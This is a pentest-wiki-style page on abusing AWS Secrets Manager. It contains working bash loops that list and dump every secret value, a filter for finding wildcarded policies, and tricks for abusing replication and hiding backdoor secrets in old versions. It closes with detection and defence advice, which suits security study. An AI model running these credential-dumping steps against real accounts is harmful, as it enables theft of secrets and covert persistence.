---
title: AWS Secrets Manager abuse
slug: aws-secrets-manager
---

> **TL;DR:** Secret-resource policies and the KMS key policy are two independent gates — wildcards on either one, plus cross-region/cross-account replication, turn a low-priv foothold into a credential vault dump.

## What it is
Secrets Manager protects each secret with two layers: the secret's resource policy (who can call `GetSecretValue`) and the KMS CMK's key policy (who can `Decrypt` the ciphertext). Many environments leave one wide open while hardening the other — `"Resource": "*"` on `secretsmanager:GetSecretValue` in an IAM role, or `kms:Decrypt` on the default account-root key policy. Replication to other regions/accounts then propagates the same weak gate everywhere the secret lives.

## Preconditions / where it applies
- Foothold principal with any of: `secretsmanager:GetSecretValue`, `secretsmanager:DescribeSecret`, `secretsmanager:ListSecrets`, `secretsmanager:GetResourcePolicy`.
- The CMK that wraps the secret must permit `kms:Decrypt` for the same principal (default `aws/secretsmanager` key trusts account-root, so any IAM principal with `kms:Decrypt` on `*` works).
- For cross-account: target secret has a resource policy listing your account or `*`.

## Technique
**Enumerate then dump:**

```bash
aws secretsmanager list-secrets --query 'SecretList[].[Name,KmsKeyId,ARN]' --output table
for s in $(aws secretsmanager list-secrets --query 'SecretList[].ARN' --output text); do
  aws secretsmanager get-secret-value --secret-id "$s" --query SecretString --output text
done
```

**Find wildcarded resource policies:**

```bash
for s in $(aws secretsmanager list-secrets --query 'SecretList[].ARN' --output text); do
  aws secretsmanager get-resource-policy --secret-id "$s" --query ResourcePolicy --output text
done | jq -c '. | fromjson? | select(.Statement[].Principal.AWS == "*" or .Statement[].Principal == "*")'
```

**Replication abuse:** an attacker with `secretsmanager:ReplicateSecretToRegions` can replicate a secret into a region where they control the CMK (or where the resource policy permits broader access), then read the replica. The replica inherits the source's value at replication time and stays in sync.

**Versioning trick:** `PutSecretValue` adds a new version; the previous version is still retrievable by `VersionId` until `secretsmanager:UpdateSecretVersionStage` removes the `AWSPREVIOUS` label. Useful both for stealth persistence (stash a backdoor secret in an old version) and to recover rotated DB passwords.

**KMS gate bypass:** when the secret uses the default `aws/secretsmanager` key, the secret's resource policy is the only gate — KMS trusts account-root. Custom CMKs with tight key policies are the real defence.

Chain into [[aws-iam-enum]] to find which principals can read which secrets, and use [[token-stealing-cloud]] to extract from Lambda/EC2 env vars.

## Detection and defence
- CloudTrail: alert on `GetSecretValue` volume spikes per principal, and on any `GetSecretValue` from outside expected workload roles.
- Use a customer-managed KMS CMK with a tight key policy (decrypt only by named roles), not `aws/secretsmanager`.
- Resource policies: deny `Principal: "*"`, deny when `aws:PrincipalAccount` ≠ owner unless explicitly cross-account.
- Enable rotation and Lambda-based secret rotation so leaked values expire quickly.
- Use VPC endpoints with endpoint policies to constrain which roles can call Secrets Manager.
- Alert on `ReplicateSecretToRegions` and `PutResourcePolicy` outside change windows.

## References
- [AWS — Secrets Manager auth & access control](https://docs.aws.amazon.com/secretsmanager/latest/userguide/auth-and-access.html) — two-gate model
- [HackTricks Cloud — Secrets Manager](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-secrets-manager-enum.html) — enumeration & abuse
- [AWS — Cross-account secret access](https://docs.aws.amazon.com/secretsmanager/latest/userguide/auth-and-access_examples_cross.html) — replication mechanics
